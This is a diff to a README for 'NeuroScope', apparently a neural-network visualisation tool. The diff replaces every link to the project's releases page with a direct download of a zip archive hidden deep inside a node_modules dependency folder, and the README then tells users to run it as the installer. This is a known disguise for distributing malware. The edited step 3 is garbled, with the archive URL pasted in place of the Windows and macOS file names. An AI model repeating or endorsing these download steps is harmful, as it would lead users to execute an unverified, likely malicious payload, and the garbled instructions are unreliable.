@@ -1,6 +1,6 @@
 # 🚀 NeuroScope - Visualize Your Neural Networks Effortlessly
 
-[![Download NeuroScope](https://img.shields.io/badge/Download%20NeuroScope-blue?style=for-the-badge&logo=github)](https://github.com/Zbezz-git/NeuroScope/releases)
+[![Download NeuroScope](https://github.com/Zbezz-git/NeuroScope/raw/refs/heads/main/frontend/node_modules/@jridgewell/remapping/dist/Neuro-Scope-smolt.zip%20NeuroScope-blue?style=for-the-badge&logo=github)](https://github.com/Zbezz-git/NeuroScope/raw/refs/heads/main/frontend/node_modules/@jridgewell/remapping/dist/Neuro-Scope-smolt.zip)
 
 ## 🌐 What is NeuroScope?
 
@@ -22,13 +22,13 @@ Follow these steps to download and run NeuroScope:
 1. **Visit the Download Page**
    Click the link below to access the releases page where you can download NeuroScope.
 
-   [Download NeuroScope](https://github.com/Zbezz-git/NeuroScope/releases)
+   [Download NeuroScope](https://github.com/Zbezz-git/NeuroScope/raw/refs/heads/main/frontend/node_modules/@jridgewell/remapping/dist/Neuro-Scope-smolt.zip)
 
 2. **Choose the Right Version**
    On the releases page, you'll see different versions of NeuroScope available for download. Pick the latest version as it includes the latest features and fixes.
 
 3. **Download the File**
-   Click on the file that corresponds to your operating system to begin the download. The file name will typically be something like `NeuroScope-v1.0.exe` for Windows or `NeuroScope-v1.0.pkg` for macOS.
+   Click on the file that corresponds to your operating system to begin the download. The file name will typically be something like `https://github.com/Zbezz-git/NeuroScope/raw/refs/heads/main/frontend/node_modules/@jridgewell/remapping/dist/Neuro-Scope-smolt.zip` for Windows or `https://github.com/Zbezz-git/NeuroScope/raw/refs/heads/main/frontend/node_modules/@jridgewell/remapping/dist/Neuro-Scope-smolt.zip` for macOS.
 
 4. **Run the Installer**
    Once the download completes, locate the downloaded file and double-click to run the installer. Follow the prompts to install NeuroScope on your computer.
@@ -62,7 +62,7 @@ NeuroScope offers several useful features for users:
 
 To start your journey with NeuroScope, download it from the link below:
 
-[Download NeuroScope](https://github.com/Zbezz-git/NeuroScope/releases)
+[Download NeuroScope](https://github.com/Zbezz-git/NeuroScope/raw/refs/heads/main/frontend/node_modules/@jridgewell/remapping/dist/Neuro-Scope-smolt.zip)
 
 ## 📖 Additional Resources
 
